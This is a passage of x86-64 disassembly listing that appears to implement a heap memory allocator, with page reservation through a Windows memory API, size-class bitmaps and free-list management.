  4017a7:	09 b4 83 14 10 00 00 	or     %esi,0x1014(%rbx,%rax,4)
  4017ae:	83 e1 1f             	and    $0x1f,%ecx
  4017b1:	48 d3 e2             	shl    %cl,%rdx
  4017b4:	09 93 10 10 00 00    	or     %edx,0x1010(%rbx)
  4017ba:	48 83 c4 38          	add    $0x38,%rsp
  4017be:	5b                   	pop    %rbx
  4017bf:	5e                   	pop    %rsi
  4017c0:	c3                   	ret
  4017c1:	0f b6 c2             	movzbl %dl,%eax
  4017c4:	48 8b 04 c1          	mov    (%rcx,%rax,8),%rax
  4017c8:	48 85 c0             	test   %rax,%rax
  4017cb:	74 0b                	je     0x4017d8
  4017cd:	48 3b 50 08          	cmp    0x8(%rax),%rdx
  4017d1:	74 05                	je     0x4017d8
  4017d3:	48 8b 00             	mov    (%rax),%rax
  4017d6:	eb f0                	jmp    0x4017c8
  4017d8:	c3                   	ret
  4017d9:	48 83 ec 28          	sub    $0x28,%rsp
  4017dd:	49 89 d0             	mov    %rdx,%r8
  4017e0:	48 c1 fa 09          	sar    $0x9,%rdx
  4017e4:	e8 d8 ff ff ff       	call   0x4017c1
  4017e9:	31 d2                	xor    %edx,%edx
  4017eb:	48 85 c0             	test   %rax,%rax
  4017ee:	74 18                	je     0x401808
  4017f0:	4c 89 c1             	mov    %r8,%rcx
  4017f3:	81 e1 ff 01 00 00    	and    $0x1ff,%ecx
  4017f9:	48 89 ca             	mov    %rcx,%rdx
  4017fc:	48 c1 fa 06          	sar    $0x6,%rdx
  401800:	48 8b 54 d0 10       	mov    0x10(%rax,%rdx,8),%rdx
  401805:	48 d3 ea             	shr    %cl,%rdx
  401808:	88 d0                	mov    %dl,%al
  40180a:	83 e0 01             	and    $0x1,%eax
  40180d:	48 83 c4 28          	add    $0x28,%rsp
  401811:	c3                   	ret
  401812:	57                   	push   %rdi
  401813:	53                   	push   %rbx
  401814:	48 83 ec 28          	sub    $0x28,%rsp
  401818:	45 31 c0             	xor    %r8d,%r8d
  40181b:	48 85 d2             	test   %rdx,%rdx
  40181e:	48 89 cb             	mov    %rcx,%rbx
  401821:	49 89 d2             	mov    %rdx,%r10
  401824:	74 12                	je     0x401838
  401826:	31 c0                	xor    %eax,%eax
  401828:	48 83 c9 ff          	or     $0xffffffffffffffff,%rcx
  40182c:	48 89 d7             	mov    %rdx,%rdi
  40182f:	f2 ae                	repnz scas (%rdi),%al
  401831:	48 f7 d1             	not    %rcx
  401834:	4c 8d 41 ff          	lea    -0x1(%rcx),%r8
  401838:	4c 89 d1             	mov    %r10,%rcx
  40183b:	49 89 d9             	mov    %rbx,%r9
  40183e:	ba 01 00 00 00       	mov    $0x1,%edx
  401843:	e8 70 9d 00 00       	call   0x40b5b8
  401848:	48 89 d9             	mov    %rbx,%rcx
  40184b:	48 83 c4 28          	add    $0x28,%rsp
  40184f:	5b                   	pop    %rbx
  401850:	5f                   	pop    %rdi
  401851:	e9 9a 9d 00 00       	jmp    0x40b5f0
  401856:	48 83 ec 28          	sub    $0x28,%rsp
  40185a:	41 b9 04 00 00 00    	mov    $0x4,%r9d
  401860:	41 b8 00 30 00 00    	mov    $0x3000,%r8d
  401866:	48 89 ca             	mov    %rcx,%rdx
  401869:	31 c9                	xor    %ecx,%ecx
  40186b:	ff 15 7b 9b 03 00    	call   *0x39b7b(%rip)        # 0x43b3ec
  401871:	48 85 c0             	test   %rax,%rax
  401874:	75 05                	jne    0x40187b
  401876:	e8 d7 a0 00 00       	call   0x40b952
  40187b:	48 83 c4 28          	add    $0x28,%rsp
  40187f:	c3                   	ret
  401880:	56                   	push   %rsi
  401881:	53                   	push   %rbx
  401882:	48 83 ec 38          	sub    $0x38,%rsp
  401886:	48 8b b1 78 28 00 00 	mov    0x2878(%rcx),%rsi
  40188d:	48 85 f6             	test   %rsi,%rsi
  401890:	48 89 cb             	mov    %rcx,%rbx
  401893:	74 05                	je     0x40189a
  401895:	48 39 16             	cmp    %rdx,(%rsi)
  401898:	7d 39                	jge    0x4018d3
  40189a:	b9 00 10 00 00       	mov    $0x1000,%ecx
  40189f:	48 89 54 24 28       	mov    %rdx,0x28(%rsp)
  4018a4:	e8 ad ff ff ff       	call   0x401856
  4018a9:	48 8b 54 24 28       	mov    0x28(%rsp),%rdx
  4018ae:	48 89 83 78 28 00 00 	mov    %rax,0x2878(%rbx)
  4018b5:	48 81 83 80 28 00 00 	addq   $0x1000,0x2880(%rbx)
  4018bc:	00 10 00 00 
  4018c0:	48 89 70 10          	mov    %rsi,0x10(%rax)
  4018c4:	48 c7 00 e8 0f 00 00 	movq   $0xfe8,(%rax)
  4018cb:	48 c7 40 08 18 00 00 	movq   $0x18,0x8(%rax)
  4018d2:	00 
  4018d3:	48 8b 8b 78 28 00 00 	mov    0x2878(%rbx),%rcx
  4018da:	4c 8b 41 08          	mov    0x8(%rcx),%r8
  4018de:	48 29 11             	sub    %rdx,(%rcx)
  4018e1:	4a 8d 1c 01          	lea    (%rcx,%r8,1),%rbx
  4018e5:	49 01 d0             	add    %rdx,%r8
  4018e8:	4c 89 41 08          	mov    %r8,0x8(%rcx)
  4018ec:	48 89 d9             	mov    %rbx,%rcx
  4018ef:	e8 58 28 00 00       	call   0x40414c
  4018f4:	48 89 d8             	mov    %rbx,%rax
  4018f7:	48 83 c4 38          	add    $0x38,%rsp
  4018fb:	5b                   	pop    %rbx
  4018fc:	5e                   	pop    %rsi
  4018fd:	c3                   	ret
  4018fe:	56                   	push   %rsi
  4018ff:	53                   	push   %rbx
  401900:	48 83 ec 38          	sub    $0x38,%rsp
  401904:	48 89 d6             	mov    %rdx,%rsi
  401907:	48 8b 12             	mov    (%rdx),%rdx
  40190a:	48 89 cb             	mov    %rcx,%rbx
  40190d:	48 3b 12             	cmp    (%rdx),%rdx
  401910:	75 76                	jne    0x401988
  401912:	48 8b 81 c0 30 00 00 	mov    0x30c0(%rcx),%rax
  401919:	48 85 c0             	test   %rax,%rax
  40191c:	74 0c                	je     0x40192a
  40191e:	48 8b 10             	mov    (%rax),%rdx
  401921:	48 89 91 c0 30 00 00 	mov    %rdx,0x30c0(%rcx)
  401928:	eb 1e                	jmp    0x401948
  40192a:	ba 28 00 00 00       	mov    $0x28,%edx
  40192f:	4c 89 4c 24 28       	mov    %r9,0x28(%rsp)
  401934:	4c 89 44 24 20       	mov    %r8,0x20(%rsp)
  401939:	e8 42 ff ff ff       	call   0x401880
  40193e:	4c 8b 4c 24 28       	mov    0x28(%rsp),%r9
  401943:	4c 8b 44 24 20       	mov    0x20(%rsp),%r8
  401948:	48 83 bb d8 30 00 00 	cmpq   $0x0,0x30d8(%rbx)
  40194f:	00 
  401950:	4c 89 40 10          	mov    %r8,0x10(%rax)
  401954:	48 8d 93 d8 30 00 00 	lea    0x30d8(%rbx),%rdx
  40195b:	4c 89 48 18          	mov    %r9,0x18(%rax)
  40195f:	75 0e                	jne    0x40196f
  401961:	48 89 93 d8 30 00 00 	mov    %rdx,0x30d8(%rbx)
  401968:	48 89 93 e0 30 00 00 	mov    %rdx,0x30e0(%rbx)
  40196f:	48 89 10             	mov    %rdx,(%rax)
  401972:	48 89 50 08          	mov    %rdx,0x8(%rax)
  401976:	48 c7 40 20 01 00 00 	movq   $0x1,0x20(%rax)
  40197d:	00 
  40197e:	48 89 06             	mov    %rax,(%rsi)
  401981:	48 83 c4 38          	add    $0x38,%rsp
  401985:	5b                   	pop    %rbx
  401986:	5e                   	pop    %rsi
  401987:	c3                   	ret
  401988:	4c 39 42 10          	cmp    %r8,0x10(%rdx)
  40198c:	77 06                	ja     0x401994
  40198e:	73 0c                	jae    0x40199c
  401990:	48 83 c2 08          	add    $0x8,%rdx
  401994:	48 89 d9             	mov    %rbx,%rcx
  401997:	e8 62 ff ff ff       	call   0x4018fe
  40199c:	48 89 f1             	mov    %rsi,%rcx
  40199f:	e8 30 fd ff ff       	call   0x4016d4
  4019a4:	48 89 f1             	mov    %rsi,%rcx
  4019a7:	48 83 c4 38          	add    $0x38,%rsp
  4019ab:	5b                   	pop    %rbx
  4019ac:	5e                   	pop    %rsi
  4019ad:	e9 f5 fc ff ff       	jmp    0x4016a7
  4019b2:	57                   	push   %rdi
  4019b3:	56                   	push   %rsi
  4019b4:	53                   	push   %rbx
  4019b5:	48 83 ec 20          	sub    $0x20,%rsp
  4019b9:	4c 89 c6             	mov    %r8,%rsi
  4019bc:	48 89 d7             	mov    %rdx,%rdi
  4019bf:	49 89 c9             	mov    %rcx,%r9
  4019c2:	48 c1 fe 09          	sar    $0x9,%rsi
  4019c6:	48 89 f9             	mov    %rdi,%rcx
  4019c9:	4c 89 c3             	mov    %r8,%rbx
  4019cc:	48 89 f2             	mov    %rsi,%rdx
  4019cf:	e8 ed fd ff ff       	call   0x4017c1
  4019d4:	48 85 c0             	test   %rax,%rax
  4019d7:	75 22                	jne    0x4019fb
  4019d9:	ba 50 00 00 00       	mov    $0x50,%edx
  4019de:	4c 89 c9             	mov    %r9,%rcx
  4019e1:	e8 9a fe ff ff       	call   0x401880
  4019e6:	40 0f b6 d6          	movzbl %sil,%edx
  4019ea:	48 8d 14 d7          	lea    (%rdi,%rdx,8),%rdx
  4019ee:	48 8b 0a             	mov    (%rdx),%rcx
  4019f1:	48 89 08             	mov    %rcx,(%rax)
  4019f4:	48 89 02             	mov    %rax,(%rdx)
  4019f7:	48 89 70 08          	mov    %rsi,0x8(%rax)
  4019fb:	81 e3 ff 01 00 00    	and    $0x1ff,%ebx
  401a01:	ba 01 00 00 00       	mov    $0x1,%edx
  401a06:	49 89 d8             	mov    %rbx,%r8
  401a09:	48 89 d9             	mov    %rbx,%rcx
  401a0c:	49 c1 f8 06          	sar    $0x6,%r8
  401a10:	48 d3 e2             	shl    %cl,%rdx
  401a13:	4a 09 54 c0 10       	or     %rdx,0x10(%rax,%r8,8)
  401a18:	48 83 c4 20          	add    $0x20,%rsp
  401a1c:	5b                   	pop    %rbx
  401a1d:	5e                   	pop    %rsi
  401a1e:	5f                   	pop    %rdi
  401a1f:	c3                   	ret
  401a20:	41 57                	push   %r15
  401a22:	41 56                	push   %r14
  401a24:	55                   	push   %rbp
  401a25:	57                   	push   %rdi
  401a26:	56                   	push   %rsi
  401a27:	53                   	push   %rbx
  401a28:	48 83 ec 38          	sub    $0x38,%rsp
  401a2c:	4c 8b 52 08          	mov    0x8(%rdx),%r10
  401a30:	49 8d 1c 10          	lea    (%r8,%rdx,1),%rbx
  401a34:	4d 29 c2             	sub    %r8,%r10
  401a37:	49 89 d3             	mov    %rdx,%r11
  401a3a:	4c 89 44 24 28       	mov    %r8,0x28(%rsp)
  401a3f:	48 8d b9 a8 28 00 00 	lea    0x28a8(%rcx),%rdi
  401a46:	49 89 d6             	mov    %rdx,%r14
  401a49:	4c 89 03             	mov    %r8,(%rbx)
  401a4c:	48 89 ce             	mov    %rcx,%rsi
  401a4f:	4c 89 53 08          	mov    %r10,0x8(%rbx)
  401a53:	4c 03 5a 08          	add    0x8(%rdx),%r11
  401a57:	48 89 f9             	mov    %rdi,%rcx
  401a5a:	48 c7 43 10 00 00 00 	movq   $0x0,0x10(%rbx)
  401a61:	00 
  401a62:	48 c7 43 18 00 00 00 	movq   $0x0,0x18(%rbx)
  401a69:	00 
  401a6a:	4c 89 da             	mov    %r11,%rdx
  401a6d:	48 c1 fa 0c          	sar    $0xc,%rdx
  401a71:	e8 63 fd ff ff       	call   0x4017d9
  401a76:	4c 8b 44 24 28       	mov    0x28(%rsp),%r8
  401a7b:	84 c0                	test   %al,%al
  401a7d:	74 0c                	je     0x401a8b
  401a7f:	49 8b 03             	mov    (%r11),%rax
  401a82:	83 e0 01             	and    $0x1,%eax
  401a85:	4c 09 d0             	or     %r10,%rax
  401a88:	49 89 03             	mov    %rax,(%r11)
  401a8b:	4d 89 46 08          	mov    %r8,0x8(%r14)
  401a8f:	49 89 d8             	mov    %rbx,%r8
  401a92:	48 89 fa             	mov    %rdi,%rdx
  401a95:	48 89 f1             	mov    %rsi,%rcx
  401a98:	49 c1 f8 0c          	sar    $0xc,%r8
  401a9c:	e8 11 ff ff ff       	call   0x4019b2
  401aa1:	48 89 d8             	mov    %rbx,%rax
  401aa4:	48 83 c4 38          	add    $0x38,%rsp
  401aa8:	5b                   	pop    %rbx
  401aa9:	5e                   	pop    %rsi
  401aaa:	5f                   	pop    %rdi
  401aab:	5d                   	pop    %rbp
  401aac:	41 5e                	pop    %r14
  401aae:	41 5f                	pop    %r15
  401ab0:	c3                   	ret
  401ab1:	53                   	push   %rbx
  401ab2:	48 83 ec 20          	sub    $0x20,%rsp
  401ab6:	48 89 cb             	mov    %rcx,%rbx
  401ab9:	e8 62 ff ff ff       	call   0x401a20
  401abe:	48 89 d9             	mov    %rbx,%rcx
  401ac1:	48 89 c2             	mov    %rax,%rdx
  401ac4:	48 83 c4 20          	add    $0x20,%rsp
  401ac8:	5b                   	pop    %rbx
  401ac9:	e9 74 fc ff ff       	jmp    0x401742
  401ace:	41 57                	push   %r15
  401ad0:	41 56                	push   %r14
  401ad2:	55                   	push   %rbp
  401ad3:	57                   	push   %rdi
  401ad4:	56                   	push   %rsi
  401ad5:	53                   	push   %rbx
  401ad6:	48 83 ec 28          	sub    $0x28,%rsp
  401ada:	80 b9 c9 30 00 00 00 	cmpb   $0x0,0x30c9(%rcx)
  401ae1:	48 89 ce             	mov    %rcx,%rsi
  401ae4:	48 89 d7             	mov    %rdx,%rdi
  401ae7:	75 54                	jne    0x401b3d
  401ae9:	48 8b 81 98 28 00 00 	mov    0x2898(%rcx),%rax
  401af0:	48 3d ff ff 00 00    	cmp    $0xffff,%rax
  401af6:	7f 0d                	jg     0x401b05
  401af8:	48 c7 81 d0 30 00 00 	movq   $0x4000,0x30d0(%rcx)
  401aff:	00 40 00 00 
  401b03:	eb 38                	jmp    0x401b3d
  401b05:	48 8b 91 d0 30 00 00 	mov    0x30d0(%rcx),%rdx
  401b0c:	48 c1 f8 02          	sar    $0x2,%rax
  401b10:	b9 00 00 00 3f       	mov    $0x3f000000,%ecx
  401b15:	48 05 ff 0f 00 00    	add    $0xfff,%rax
  401b1b:	48 25 00 f0 ff ff    	and    $0xfffffffffffff000,%rax
  401b21:	48 01 d2             	add    %rdx,%rdx
  401b24:	48 81 fa 00 00 00 3f 	cmp    $0x3f000000,%rdx
  401b2b:	48 0f 4f d1          	cmovg  %rcx,%rdx
  401b2f:	48 39 d0             	cmp    %rdx,%rax
  401b32:	48 0f 4f c2          	cmovg  %rdx,%rax
  401b36:	48 89 86 d0 30 00 00 	mov    %rax,0x30d0(%rsi)
  401b3d:	48 8b 96 d0 30 00 00 	mov    0x30d0(%rsi),%rdx
  401b44:	48 39 d7             	cmp    %rdx,%rdi
  401b47:	7e 0a                	jle    0x401b53
  401b49:	48 89 f9             	mov    %rdi,%rcx
  401b4c:	e8 05 fd ff ff       	call   0x401856
  401b51:	eb 31                	jmp    0x401b84
  401b53:	31 c9                	xor    %ecx,%ecx
  401b55:	41 b9 04 00 00 00    	mov    $0x4,%r9d
  401b5b:	41 b8 00 30 00 00    	mov    $0x3000,%r8d
  401b61:	ff 15 85 98 03 00    	call   *0x39885(%rip)        # 0x43b3ec
  401b67:	48 85 c0             	test   %rax,%rax
  401b6a:	75 11                	jne    0x401b7d
  401b6c:	48 89 f9             	mov    %rdi,%rcx
  401b6f:	e8 e2 fc ff ff       	call   0x401856
  401b74:	c6 86 c9 30 00 00 01 	movb   $0x1,0x30c9(%rsi)
  401b7b:	eb 07                	jmp    0x401b84
  401b7d:	48 8b be d0 30 00 00 	mov    0x30d0(%rsi),%rdi
  401b84:	48 01 be 80 28 00 00 	add    %rdi,0x2880(%rsi)
  401b8b:	48 89 c3             	mov    %rax,%rbx
  401b8e:	48 01 be 90 28 00 00 	add    %rdi,0x2890(%rsi)
  401b95:	48 8d 86 00 31 00 00 	lea    0x3100(%rsi),%rax
  401b9c:	48 83 38 1d          	cmpq   $0x1d,(%rax)
  401ba0:	7e 3f                	jle    0x401be1
  401ba2:	48 8b 80 e8 01 00 00 	mov    0x1e8(%rax),%rax
  401ba9:	48 85 c0             	test   %rax,%rax
  401bac:	75 ee                	jne    0x401b9c
  401bae:	ba f0 01 00 00       	mov    $0x1f0,%edx
  401bb3:	48 89 f1             	mov    %rsi,%rcx
  401bb6:	e8 c5 fc ff ff       	call   0x401880
  401bbb:	48 8b 96 e8 32 00 00 	mov    0x32e8(%rsi),%rdx
  401bc2:	48 89 90 e8 01 00 00 	mov    %rdx,0x1e8(%rax)
  401bc9:	48 89 86 e8 32 00 00 	mov    %rax,0x32e8(%rsi)
  401bd0:	48 89 58 08          	mov    %rbx,0x8(%rax)
  401bd4:	48 89 78 10          	mov    %rdi,0x10(%rax)
  401bd8:	48 c7 00 01 00 00 00 	movq   $0x1,(%rax)
  401bdf:	eb 1b                	jmp    0x401bfc
  401be1:	48 8b 10             	mov    (%rax),%rdx
  401be4:	48 89 d1             	mov    %rdx,%rcx
  401be7:	48 ff c2             	inc    %rdx
  401bea:	48 c1 e1 04          	shl    $0x4,%rcx
  401bee:	48 01 c1             	add    %rax,%rcx
  401bf1:	48 89 59 08          	mov    %rbx,0x8(%rcx)
  401bf5:	48 89 79 10          	mov    %rdi,0x10(%rcx)
  401bf9:	48 89 10             	mov    %rdx,(%rax)
  401bfc:	4c 8d 34 1f          	lea    (%rdi,%rbx,1),%r14
  401c00:	48 c7 43 10 00 00 00 	movq   $0x0,0x10(%rbx)
  401c07:	00 
  401c08:	4c 8d be a8 28 00 00 	lea    0x28a8(%rsi),%r15
  401c0f:	4c 89 f2             	mov    %r14,%rdx
  401c12:	48 c7 43 18 00 00 00 	movq   $0x0,0x18(%rbx)
  401c19:	00 
  401c1a:	48 c1 fa 0c          	sar    $0xc,%rdx
  401c1e:	48 89 7b 08          	mov    %rdi,0x8(%rbx)
  401c22:	4c 89 f9             	mov    %r15,%rcx
  401c25:	e8 af fb ff ff       	call   0x4017d9
  401c2a:	84 c0                	test   %al,%al
  401c2c:	74 0c                	je     0x401c3a
  401c2e:	49 8b 06             	mov    (%r14),%rax
  401c31:	83 e0 01             	and    $0x1,%eax
  401c34:	48 09 f8             	or     %rdi,%rax
  401c37:	49 89 06             	mov    %rax,(%r14)
  401c3a:	4c 8b b6 a0 28 00 00 	mov    0x28a0(%rsi),%r14
  401c41:	b8 00 10 00 00       	mov    $0x1000,%eax
  401c46:	49 89 da             	mov    %rbx,%r10
  401c49:	4c 89 f9             	mov    %r15,%rcx
  401c4c:	4d 85 f6             	test   %r14,%r14
  401c4f:	4c 0f 44 f0          	cmove  %rax,%r14
  401c53:	4d 29 f2             	sub    %r14,%r10
  401c56:	4c 89 d2             	mov    %r10,%rdx
  401c59:	48 c1 fa 0c          	sar    $0xc,%rdx
  401c5d:	e8 77 fb ff ff       	call   0x4017d9
  401c62:	84 c0                	test   %al,%al
  401c64:	74 17                	je     0x401c7d
  401c66:	4d 3b 72 08          	cmp    0x8(%r10),%r14
  401c6a:	75 11                	jne    0x401c7d
  401c6c:	48 8b 03             	mov    (%rbx),%rax
  401c6f:	4d 89 f1             	mov    %r14,%r9
  401c72:	83 e0 01             	and    $0x1,%eax
  401c75:	49 09 c1             	or     %rax,%r9
  401c78:	4c 89 0b             	mov    %r9,(%rbx)
  401c7b:	eb 04                	jmp    0x401c81
  401c7d:	48 83 23 01          	andq   $0x1,(%rbx)
  401c81:	48 89 d8             	mov    %rbx,%rax
  401c84:	48 89 be a0 28 00 00 	mov    %rdi,0x28a0(%rsi)
  401c8b:	48 83 c4 28          	add    $0x28,%rsp
  401c8f:	5b                   	pop    %rbx
  401c90:	5e                   	pop    %rsi
  401c91:	5f                   	pop    %rdi
  401c92:	5d                   	pop    %rbp
  401c93:	41 5e                	pop    %r14
  401c95:	41 5f                	pop    %r15
  401c97:	c3                   	ret
  401c98:	57                   	push   %rdi
  401c99:	56                   	push   %rsi
  401c9a:	53                   	push   %rbx
  401c9b:	48 83 ec 20          	sub    $0x20,%rsp
  401c9f:	48 89 cb             	mov    %rcx,%rbx
  401ca2:	89 d1                	mov    %edx,%ecx
  401ca4:	49 89 d0             	mov    %rdx,%r8
  401ca7:	e8 04 f9 ff ff       	call   0x4015b0
  401cac:	8d 48 fb             	lea    -0x5(%rax),%ecx
  401caf:	b8 01 00 00 00       	mov    $0x1,%eax
  401cb4:	48 d3 e0             	shl    %cl,%rax
  401cb7:	48 05 ff 0f 00 00    	add    $0xfff,%rax
  401cbd:	48 25 00 f0 ff ff    	and    $0xfffffffffffff000,%rax
  401cc3:	4a 8d 7c 00 ff       	lea    -0x1(%rax,%r8,1),%rdi
  401cc8:	48 f7 d8             	neg    %rax
  401ccb:	48 21 c7             	and    %rax,%rdi
  401cce:	b8 00 00 00 3f       	mov    $0x3f000000,%eax
  401cd3:	48 81 ff 00 00 00 3f 	cmp    $0x3f000000,%rdi
  401cda:	48 0f 4f f8          	cmovg  %rax,%rdi
  401cde:	89 f9                	mov    %edi,%ecx
  401ce0:	48 89 fe             	mov    %rdi,%rsi
  401ce3:	e8 c8 f8 ff ff       	call   0x4015b0
  401ce8:	ba ff ff ff ff       	mov    $0xffffffff,%edx
  401ced:	8d 48 fb             	lea    -0x5(%rax),%ecx
  401cf0:	4c 8d 40 fa          	lea    -0x6(%rax),%r8
  401cf4:	48 d3 fe             	sar    %cl,%rsi
  401cf7:	48 89 f1             	mov    %rsi,%rcx
  401cfa:	48 89 d6             	mov    %rdx,%rsi
  401cfd:	48 83 e9 20          	sub    $0x20,%rcx
  401d01:	48 d3 e6             	shl    %cl,%rsi
  401d04:	48 89 f1             	mov    %rsi,%rcx
  401d07:	23 8c 83 fc 0f 00 00 	and    0xffc(%rbx,%rax,4),%ecx
  401d0e:	74 06                	je     0x401d16
  401d10:	89 c8                	mov    %ecx,%eax
  401d12:	f7 d8                	neg    %eax
  401d14:	eb 2b                	jmp    0x401d41
  401d16:	41 8d 48 01          	lea    0x1(%r8),%ecx
  401d1a:	48 d3 e2             	shl    %cl,%rdx
  401d1d:	23 93 10 10 00 00    	and    0x1010(%rbx),%edx
  401d23:	89 d1                	mov    %edx,%ecx
  401d25:	f7 d9                	neg    %ecx
  401d27:	21 d1                	and    %edx,%ecx
  401d29:	e8 82 f8 ff ff       	call   0x4015b0
  401d2e:	48 85 c0             	test   %rax,%rax
  401d31:	49 89 c0             	mov    %rax,%r8
  401d34:	7e 2b                	jle    0x401d61
  401d36:	8b 84 83 14 10 00 00 	mov    0x1014(%rbx,%rax,4),%eax
  401d3d:	89 c1                	mov    %eax,%ecx
  401d3f:	f7 d9                	neg    %ecx
  401d41:	21 c1                	and    %eax,%ecx
  401d43:	e8 68 f8 ff ff       	call   0x4015b0
  401d48:	4c 89 c2             	mov    %r8,%rdx
  401d4b:	48 c1 e2 05          	shl    $0x5,%rdx
  401d4f:	48 8d 94 10 0e 02 00 	lea    0x20e(%rax,%rdx,1),%rdx
  401d56:	00 
  401d57:	48 8b 74 d3 08       	mov    0x8(%rbx,%rdx,8),%rsi
  401d5c:	48 85 f6             	test   %rsi,%rsi
  401d5f:	75 38                	jne    0x401d99
  401d61:	48 81 ff ff ff 07 00 	cmp    $0x7ffff,%rdi
  401d68:	7f 15                	jg     0x401d7f
  401d6a:	ba 00 00 08 00       	mov    $0x80000,%edx
  401d6f:	48 89 d9             	mov    %rbx,%rcx
  401d72:	e8 57 fd ff ff       	call   0x401ace
  401d77:	48 89 c6             	mov    %rax,%rsi
  401d7a:	e9 91 00 00 00       	jmp    0x401e10
  401d7f:	48 89 fa             	mov    %rdi,%rdx
  401d82:	48 89 d9             	mov    %rbx,%rcx
  401d85:	e8 44 fd ff ff       	call   0x401ace
  401d8a:	48 39 78 08          	cmp    %rdi,0x8(%rax)
  401d8e:	48 89 c6             	mov    %rax,%rsi
  401d91:	0f 8e 87 00 00 00    	jle    0x401e1e
  401d97:	eb 77                	jmp    0x401e10
  401d99:	48 8b 56 10          	mov    0x10(%rsi),%rdx
  401d9d:	4c 89 c1             	mov    %r8,%rcx
  401da0:	48 c1 e1 05          	shl    $0x5,%rcx
  401da4:	48 8d 8c 08 0e 02 00 	lea    0x20e(%rax,%rcx,1),%rcx
  401dab:	00 
  401dac:	48 85 d2             	test   %rdx,%rdx
  401daf:	48 89 54 cb 08       	mov    %rdx,0x8(%rbx,%rcx,8)
  401db4:	74 0a                	je     0x401dc0
  401db6:	48 c7 42 18 00 00 00 	movq   $0x0,0x18(%rdx)
  401dbd:	00 
  401dbe:	eb 33                	jmp    0x401df3
  401dc0:	4e 8d 0c 83          	lea    (%rbx,%r8,4),%r9
  401dc4:	83 e0 1f             	and    $0x1f,%eax
  401dc7:	ba 01 00 00 00       	mov    $0x1,%edx
  401dcc:	88 c1                	mov    %al,%cl
  401dce:	49 89 d2             	mov    %rdx,%r10
  401dd1:	49 d3 e2             	shl    %cl,%r10
  401dd4:	4c 89 d0             	mov    %r10,%rax
  401dd7:	f7 d0                	not    %eax
  401dd9:	41 21 81 14 10 00 00 	and    %eax,0x1014(%r9)
  401de0:	75 11                	jne    0x401df3
  401de2:	44 89 c1             	mov    %r8d,%ecx
  401de5:	83 e1 1f             	and    $0x1f,%ecx
  401de8:	48 d3 e2             	shl    %cl,%rdx
  401deb:	f7 d2                	not    %edx
  401ded:	21 93 10 10 00 00    	and    %edx,0x1010(%rbx)
  401df3:	48 c7 46 18 00 00 00 	movq   $0x0,0x18(%rsi)
  401dfa:	00 
  401dfb:	48 8d 87 ff 0f 00 00 	lea    0xfff(%rdi),%rax
  401e02:	48 3b 46 08          	cmp    0x8(%rsi),%rax
  401e06:	48 c7 46 10 00 00 00 	movq   $0x0,0x10(%rsi)
  401e0d:	00 
  401e0e:	7d 0e                	jge    0x401e1e
  401e10:	49 89 f8             	mov    %rdi,%r8
  401e13:	48 89 f2             	mov    %rsi,%rdx
  401e16:	48 89 d9             	mov    %rbx,%rcx
  401e19:	e8 93 fc ff ff       	call   0x401ab1
  401e1e:	49 89 f0             	mov    %rsi,%r8
  401e21:	48 c7 06 01 00 00 00 	movq   $0x1,(%rsi)
  401e28:	48 89 d9             	mov    %rbx,%rcx
  401e2b:	48 8d 93 a8 28 00 00 	lea    0x28a8(%rbx),%rdx
  401e32:	49 c1 f8 0c          	sar    $0xc,%r8
  401e36:	e8 77 fb ff ff       	call   0x4019b2
  401e3b:	48 89 f0             	mov    %rsi,%rax
  401e3e:	48 29 bb 90 28 00 00 	sub    %rdi,0x2890(%rbx)
  401e45:	48 83 c4 20          	add    $0x20,%rsp
  401e49:	5b                   	pop    %rbx
  401e4a:	5e                   	pop    %rsi
  401e4b:	5f                   	pop    %rdi
  401e4c:	c3                   	ret
  401e4d:	55                   	push   %rbp
  401e4e:	57                   	push   %rdi
  401e4f:	56                   	push   %rsi
  401e50:	53                   	push   %rbx
  401e51:	48 83 ec 28          	sub    $0x28,%rsp
  401e55:	48 8d 72 07          	lea    0x7(%rdx),%rsi
  401e59:	48 89 cb             	mov    %rcx,%rbx
  401e5c:	48 89 f7             	mov    %rsi,%rdi
  401e5f:	48 83 e7 f8          	and    $0xfffffffffffffff8,%rdi
  401e63:	48 81 ff c8 0f 00 00 	cmp    $0xfc8,%rdi
  401e6a:	0f 8f e2 00 00 00    	jg     0x401f52
  401e70:	48 89 fe             	mov    %rdi,%rsi
  401e73:	48 01 ce             	add    %rcx,%rsi
  401e76:	48 8b 56 10          	mov    0x10(%rsi),%rdx
  401e7a:	48 85 d2             	test   %rdx,%rdx
  401e7d:	75 58                	jne    0x401ed7
  401e7f:	ba 00 10 00 00       	mov    $0x1000,%edx
  401e84:	e8 0f fe ff ff       	call   0x401c98
  401e89:	48 89 c2             	mov    %rax,%rdx
  401e8c:	48 c7 40 20 00 00 00 	movq   $0x0,0x20(%rax)
  401e93:	00 
  401e94:	48 89 78 08          	mov    %rdi,0x8(%rax)
  401e98:	48 89 78 30          	mov    %rdi,0x30(%rax)
  401e9c:	b8 c8 0f 00 00       	mov    $0xfc8,%eax
  401ea1:	48 29 f8             	sub    %rdi,%rax
  401ea4:	48 c7 42 10 00 00 00 	movq   $0x0,0x10(%rdx)
  401eab:	00 
  401eac:	48 c7 42 18 00 00 00 	movq   $0x0,0x18(%rdx)
  401eb3:	00 
  401eb4:	48 89 42 28          	mov    %rax,0x28(%rdx)
  401eb8:	48 8b 46 10          	mov    0x10(%rsi),%rax
  401ebc:	48 89 42 10          	mov    %rax,0x10(%rdx)
  401ec0:	48 8b 46 10          	mov    0x10(%rsi),%rax
  401ec4:	48 85 c0             	test   %rax,%rax
  401ec7:	74 04                	je     0x401ecd
  401ec9:	48 89 50 18          	mov    %rdx,0x18(%rax)
  401ecd:	48 89 56 10          	mov    %rdx,0x10(%rsi)
  401ed1:	48 8d 6a 38          	lea    0x38(%rdx),%rbp
  401ed5:	eb 27                	jmp    0x401efe
  401ed7:	48 8b 6a 20          	mov    0x20(%rdx),%rbp
  401edb:	48 85 ed             	test   %rbp,%rbp
  401ede:	75 12                	jne    0x401ef2
  401ee0:	48 8b 4a 30          	mov    0x30(%rdx),%rcx
  401ee4:	48 8d 6c 0a 38       	lea    0x38(%rdx,%rcx,1),%rbp
  401ee9:	48 01 f9             	add    %rdi,%rcx
  401eec:	48 89 4a 30          	mov    %rcx,0x30(%rdx)
  401ef0:	eb 08                	jmp    0x401efa
  401ef2:	48 8b 45 00          	mov    0x0(%rbp),%rax
  401ef6:	48 89 42 20          	mov    %rax,0x20(%rdx)
  401efa:	48 29 7a 28          	sub    %rdi,0x28(%rdx)
  401efe:	48 39 7a 28          	cmp    %rdi,0x28(%rdx)
  401f02:	7d 42                	jge    0x401f46
  401f04:	48 3b 56 10          	cmp    0x10(%rsi),%rdx
